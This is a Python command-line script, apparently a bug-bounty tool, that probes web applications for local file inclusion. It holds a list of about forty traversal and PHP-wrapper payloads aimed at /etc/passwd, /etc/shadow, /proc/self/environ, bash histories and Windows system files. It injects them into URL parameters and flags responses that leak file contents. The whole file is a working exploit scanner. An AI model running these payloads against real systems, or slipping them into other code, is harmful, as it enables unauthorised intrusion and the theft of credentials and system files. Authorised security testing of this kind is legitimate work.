#!/usr/bin/env python3
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

LFI_PAYLOADS = [
    {"name": "etc_passwd", "payload": "../../../../../../../../etc/passwd", "detect": "root:x:0:0"},
    {"name": "etc_passwd_double_dot_slash", "payload": "....//....//....//....//....//etc/passwd", "detect": "root:x:0:0"},
    {"name": "etc_passwd_null", "payload": "../../../../../../../../etc/passwd%00", "detect": "root:x:0:0"},
    {"name": "etc_passwd_null_hex", "payload": "../../../../../../../../etc/passwd\x00", "detect": "root:x:0:0"},
    {"name": "etc_passwd_url_encoded", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "detect": "root:x:0:0"},
    {"name": "etc_passwd_double_encoded", "payload": "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", "detect": "root:x:0:0"},
    {"name": "windows_win_ini", "payload": "../../../../../../../../windows/win.ini", "detect": "[fonts]"},
    {"name": "windows_win_ini_backslash", "payload": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", "detect": "[fonts]"},
    {"name": "windows_hosts", "payload": "../../../../../../../../windows/system32/drivers/etc/hosts", "detect": "localhost"},
    {"name": "etc_hostname", "payload": "../../../../../../../../etc/hostname", "detect": None},
    {"name": "etc_issue", "payload": "../../../../../../../../etc/issue", "detect": None},
    {"name": "proc_self_environ", "payload": "../../../../../../../../proc/self/environ", "detect": None},
    {"name": "proc_self_cmdline", "payload": "../../../../../../../../proc/self/cmdline", "detect": None},
    {"name": "var_log_apache", "payload": "../../../../../../../../var/log/apache2/access.log", "detect": None},
    {"name": "var_log_nginx", "payload": "../../../../../../../../var/log/nginx/access.log", "detect": None},
    {"name": "home_user_bash_history", "payload": "../../../../../../../../home/user/.bash_history", "detect": None},
    {"name": "root_bash_history", "payload": "../../../../../../../../root/.bash_history", "detect": None},
    {"name": "etc_shadow", "payload": "../../../../../../../../etc/shadow", "detect": "root:"},
    {"name": "php_filter_base64", "payload": "php://filter/convert.base64-encode/resource=index.php", "detect": "PD9waHA="},
    {"name": "php_filter_base64_etc_passwd", "payload": "php://filter/convert.base64-encode/resource=/etc/passwd", "detect": "cm9vdDp4OjA6MA=="},
    {"name": "php_filter_rot13", "payload": "php://filter/read=string.rot13/resource=index.php", "detect": None},
    {"name": "php_input_stream", "payload": "php://input", "detect": None},
    {"name": "data_wrapper_text", "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "detect": "phpinfo"},
    {"name": "expect_id", "payload": "expect://id", "detect": "uid="},
    {"name": "glob_cert_files", "payload": "glob:///etc/ssl/certs/*.pem", "detect": None},
    {"name": "ogg_audio", "payload": "ogg:///etc/passwd", "detect": None},
    {"name": "path_traversal_absolute", "payload": "/etc/passwd", "detect": "root:x:0:0"},
    {"name": "path_traversal_file_uri", "payload": "file:///etc/passwd", "detect": "root:x:0:0"},
    {"name": "path_traversal_file_uri_windows", "payload": "file:///c:/windows/win.ini", "detect": "[fonts]"},
    {"name": "path_traversal_backslash_escape", "payload": "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd", "detect": "root:x:0:0"},
    {"name": "path_traversal_unicode_dot", "payload": "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", "detect": "root:x:0:0"},
    {"name": "path_traversal_unicode_slash", "payload": "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "detect": "root:x:0:0"},
    {"name": "path_traversal_backslash_null", "payload": "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00", "detect": "root:x:0:0"},
    {"name": "path_traversal_two_dots_only", "payload": "....//....//....//....//....//....//etc/passwd", "detect": "root:x:0:0"},
    {"name": "path_traversal_percent_2e", "payload": "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "detect": "root:x:0:0"},
    {"name": "path_traversal_percent_252e", "payload": "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd", "detect": "root:x:0:0"},
    {"name": "proc_self_fd", "payload": "../../../../../../../../proc/self/fd/0", "detect": None},
    {"name": "proc_self_cwd_index", "payload": "../../../../../../../../proc/self/cwd/index.php", "detect": None},
    {"name": "dev_fd", "payload": "/dev/fd/0", "detect": None},
    {"name": "dev_stdin", "payload": "/dev/stdin", "detect": None},
    {"name": "php_session_serialized", "payload": "../../../../../../../../tmp/sess_", "detect": None},
]


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_urls(urls_file):
    urls = []
    if not urls_file or not os.path.exists(urls_file):
        return urls
    with open(urls_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def extract_params_from_url(url):
    params = set()
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    for k in query_params:
        params.add(k)
    param_pattern = re.findall(r'[?&]([\w\[\]]+)=', url)
    for p in param_pattern:
        params.add(p)
    return list(params)


def inject_payload(url, param, payload_str):
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param in query_params:
        query_params[param] = [payload_str]
    else:
        query_params[param] = [payload_str]
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    parts = list(parsed)
    parts[4] = new_query
    return urllib.parse.urlunparse(parts)


def detect_lfi_leak(response_text, detect_pattern):
    if not response_text or not detect_pattern:
        return False, None
    if detect_pattern in response_text:
        idx = response_text.find(detect_pattern)
        start = max(0, idx - 60)
        end = min(len(response_text), idx + 140)
        return True, response_text[start:end]
    return False, None


def compute_lfi_confidence(detected, detect_pattern, response_length, status_code):
    if not detected:
        return 0.0
    base = 0.5
    if detect_pattern == "root:x:0:0":
        base = 0.95
    elif detect_pattern and "PD9waHA=" in detect_pattern:
        base = 0.9
    elif detect_pattern == "[fonts]":
        base = 0.85
    elif detect_pattern == "localhost":
        base = 0.8
    elif detect_pattern and "root:" in detect_pattern:
        base = 0.75
    elif detect_pattern and "uid=" in detect_pattern:
        base = 0.9
    if response_length > 0:
        if response_length < 100:
            base = max(0.1, base - 0.2)
        elif response_length > 5000:
            base = min(1.0, base + 0.05)
    return round(base, 2)


def probe_lfi_payload(url, param, pdef, session, timeout, rate_limit, dry_run):
    result = {
        "url": url,
        "param": param,
        "payload_name": pdef["name"],
        "payload": pdef["payload"],
        "detect_pattern": pdef.get("detect"),
        "technique": "lfi_path_traversal",
        "lfi_detected": False,
        "evidence_snippet": None,
        "status_code": 0,
        "response_length": 0,
        "baseline_length": 0,
        "confidence": 0.0,
        "dry_run": dry_run,
    }
    if dry_run:
        test_url = inject_payload(url, param, pdef["payload"])
        print(f"[dry-run] LFI: {test_url} technique={pdef['name']}", file=sys.stderr)
        return result
    try:
        baseline_resp = session.get(url, timeout=timeout, allow_redirects=True)
        result["baseline_length"] = len(baseline_resp.text)
        test_url = inject_payload(url, param, pdef["payload"])
        resp = session.get(test_url, timeout=timeout, allow_redirects=True)
        result["status_code"] = resp.status_code
        result["response_length"] = len(resp.text)
        detect_pattern = pdef.get("detect")
        detected, evidence = detect_lfi_leak(resp.text, detect_pattern)
        result["lfi_detected"] = detected
        result["evidence_snippet"] = evidence
        result["confidence"] = compute_lfi_confidence(detected, detect_pattern, len(resp.text), resp.status_code)
        if detected:
            print(f"[lfi] {url} param={param} technique={pdef['name']} conf={result['confidence']}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.RequestException:
        pass
    return result


def main():
    parser = argparse.ArgumentParser(
        description="LFI Probe — test for Local File Inclusion via path traversal and PHP wrappers",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --urls live_urls.txt --context .bb/context.json
  %(prog)s --urls single_url.txt --context .bb/context.json --dry-run
  %(prog)s --urls urls.txt --rate-limit 5 --timeout 10
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--urls", required=True, help="File with target URLs, one per line")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--rate-limit", type=int, default=5, help="Max requests per second (default: 5)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--concurrency", type=int, default=3, help="Thread pool concurrency (default: 3)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned requests without executing")
    parser.add_argument("--user-agent", default="BugBountyAgent/2.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--proxy", default=None, help="HTTP proxy")
    parser.add_argument("--retries", type=int, default=2, help="Retries (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    os.makedirs(outdir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "lfi_findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        print("[error] No URLs loaded from --urls file.", file=sys.stderr)
        sys.exit(1)

    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session_base = requests.Session()
    session_base.headers.update({"User-Agent": args.user_agent})
    if proxy_dict:
        session_base.proxies.update(proxy_dict)
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session_base.mount("https://", adapter)
    session_base.mount("http://", adapter)

    tasks = []
    for url in urls:
        params = extract_params_from_url(url)
        if not params:
            params = ["file", "page", "path", "template", "view", "include", "dir", "folder", "document", "doc", "read", "open", "load", "module", "plugin", "theme", "style", "layout", "lang", "language"]
        for param in params:
            for pdef in LFI_PAYLOADS:
                tasks.append((url, param, pdef))

    print(f"[info] Prepared {len(tasks)} LFI probe tasks across {len(urls)} URLs", file=sys.stderr)

    if args.dry_run:
        for url, param, pdef in tasks:
            probe_lfi_payload(url, param, pdef, session_base, args.timeout, args.rate_limit, dry_run=True)
        print(f"[dry-run] Dry run complete — {len(tasks)} tasks.", file=sys.stderr)
        return

    all_findings = []
    completed = 0
    with open(output_path, "w") as outfile:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            futures = {}
            for url, param, pdef in tasks:
                future = executor.submit(
                    probe_lfi_payload, url, param, pdef,
                    requests.Session(), args.timeout, args.rate_limit, dry_run=False
                )
                futures[future] = (url, param, pdef)
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception:
                    continue
                outfile.write(json.dumps(result) + "\n")
                completed += 1
                if result.get("lfi_detected") and result.get("confidence", 0) >= 0.3:
                    all_findings.append(result)
                if completed % 200 == 0:
                    print(f"[progress] {completed}/{len(tasks)} probes", file=sys.stderr)

    high_conf = sum(1 for f in all_findings if f.get("confidence", 0) >= 0.7)
    med_conf = sum(1 for f in all_findings if 0.3 <= f.get("confidence", 0) < 0.7)

    summary = {
        "total_probes": len(tasks),
        "total_findings": len(all_findings),
        "high_confidence": high_conf,
        "medium_confidence": med_conf,
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)


if __name__ == "__main__":
    main()